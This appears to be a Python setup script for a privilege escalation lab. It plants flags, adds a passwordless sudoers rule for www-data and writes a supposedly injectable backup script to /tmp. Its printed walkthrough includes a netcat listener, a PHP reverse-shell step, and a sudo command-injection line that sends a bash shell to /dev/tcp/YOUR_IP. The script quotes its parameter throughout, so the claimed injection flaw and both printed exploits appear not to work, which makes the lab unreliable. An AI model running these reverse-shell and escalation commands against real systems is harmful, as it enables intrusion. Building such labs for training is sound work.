#!/usr/bin/env python3
"""
Setup script for privilege escalation demo in the vulnerable web application.
This creates the necessary files and configurations to demonstrate a complete attack chain:
1. Reverse shell access
2. Privilege escalation 
3. Capturing a root flag
"""

import os
import stat
import sys
import subprocess
import random
import string

# Configuration
ROOT_FLAG_CONTENT = "FLAG{c0ngr4tul4t10ns_y0u_h4v3_r00t_4cc3ss}"
USER_FLAG_CONTENT = "FLAG{y0u_f0und_th3_us3r_fl4g_n0w_try_f0r_r00t}"
BACKUP_SCRIPT_PATH = "/tmp/backup_app.sh"
ROOT_FLAG_PATH = "/root/root_flag.txt"
USER_FLAG_PATH = "restricted/flag.txt"
SUDO_CONFIG = "www-data ALL=(ALL) NOPASSWD: /tmp/backup_app.sh"

def create_colored_text(text, color_code):
    """Create colored text for terminal output"""
    return f"\033[{color_code}m{text}\033[0m"

def print_info(message):
    """Print information message"""
    print(create_colored_text("[*] " + message, "34"))

def print_success(message):
    """Print success message"""
    print(create_colored_text("[+] " + message, "32"))

def print_error(message):
    """Print error message"""
    print(create_colored_text("[-] " + message, "31"))

def print_warning(message):
    """Print warning message"""
    print(create_colored_text("[!] " + message, "33"))

def check_sudo():
    """Check if script is running with sudo privileges"""
    if os.geteuid() != 0:
        print_error("This script must be run with sudo privileges")
        print_info("Please run: sudo python3 setup_privesc_demo.py")
        sys.exit(1)

def create_backup_script():
    """Create a backup script with a SUID vulnerability"""
    print_info("Creating vulnerable backup script...")
    script_content = """#!/bin/bash
# This script backs up the web application
# VULNERABILITY: This script is allowed to run as root via sudo without password
# and contains command injection in the filename parameter

APP_DIR="."
BACKUP_DIR="/tmp"

# Get backup name from parameter or use default
BACKUP_NAME="${1:-backup_$(date +%s)}"

echo "[+] Backing up application..."
tar czf "$BACKUP_DIR/$BACKUP_NAME.tar.gz" "$APP_DIR" 2>/dev/null

# Clean up old backups - VULNERABLE to command injection!
echo "[+] Cleaning up old backups matching pattern: $BACKUP_NAME"
find "$BACKUP_DIR" -name "*$BACKUP_NAME*" -type f -mtime +7 -delete 2>/dev/null

echo "[+] Backup process completed"
"""
    
    with open(BACKUP_SCRIPT_PATH, 'w') as f:
        f.write(script_content)
    
    # Make it executable
    os.chmod(BACKUP_SCRIPT_PATH, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    print_success(f"Created backup script at {BACKUP_SCRIPT_PATH}")

def create_flags():
    """Create user and root flags"""
    print_info("Creating flags...")
    
    # Create user flag
    if not os.path.exists("restricted"):
        os.makedirs("restricted")
    
    with open(USER_FLAG_PATH, 'w') as f:
        f.write(USER_FLAG_CONTENT)
    print_success(f"Created user flag at {USER_FLAG_PATH}")
    
    # Create root flag
    try:
        with open(ROOT_FLAG_PATH, 'w') as f:
            f.write(ROOT_FLAG_CONTENT)
        print_success(f"Created root flag at {ROOT_FLAG_PATH}")
    except Exception as e:
        print_error(f"Failed to create root flag: {e}")

def configure_sudo():
    """Configure sudo to allow running the backup script without password"""
    print_info("Configuring sudo...")
    
    try:
        # Create a new sudoers file
        sudoers_file = "/etc/sudoers.d/vulnerable_app"
        with open(sudoers_file, 'w') as f:
            f.write(SUDO_CONFIG + "\n")
        os.chmod(sudoers_file, 0o440)
        print_success(f"Configured sudo for www-data user in {sudoers_file}")
    except Exception as e:
        print_error(f"Failed to configure sudo: {e}")

def display_instructions():
    """Display instructions for the demo"""
    print("\n" + "=" * 60)
    print(create_colored_text("PRIVILEGE ESCALATION DEMO - INSTRUCTIONS", "1;36"))
    print("=" * 60)
    
    print("""
The following has been set up for your demonstration:

1. A user flag at: restricted/flag.txt
2. A root flag at: /root/root_flag.txt
3. A vulnerable backup script at: /tmp/backup_app.sh
4. Sudo configured to allow www-data to run the backup script without password

Attack Chain Demonstration:

Step 1: Get a reverse shell using the PHP vulnerability
   - Upload the reverse shell PHP file
   - Set up a netcat listener: nc -lvnp 4444
   - Access the PHP file to trigger the reverse shell

Step 2: Demonstrate privilege escalation
   - From the reverse shell, run: sudo -l
   - You'll see the backup script can be run without password
   - Exploit command injection: sudo /tmp/backup_app.sh '$(bash -c "bash -i >& /dev/tcp/YOUR_IP/5555 0>&1")'
   - This gives you a root shell on port 5555

Step 3: Find the root flag
   - From the root shell, access: cat /root/root_flag.txt
   - Display the flag to prove you have root access

Alternative Exploitation Method:
   - sudo /tmp/backup_app.sh '; /bin/bash; echo'
   - This gives you a direct root shell

Make sure to set up listeners on ports 4444 and 5555!
""")
    print("=" * 60)
    print("")

def main():
    """Main function"""
    print_warning("This script will set up a privilege escalation demo.")
    print_warning("It should ONLY be used in isolated, controlled environments!")
    
    # Check if running with sudo
    check_sudo()
    
    # Create the vulnerable backup script
    create_backup_script()
    
    # Create flags
    create_flags()
    
    # Configure sudo
    configure_sudo()
    
    # Display instructions
    display_instructions()

if __name__ == "__main__":
    main() 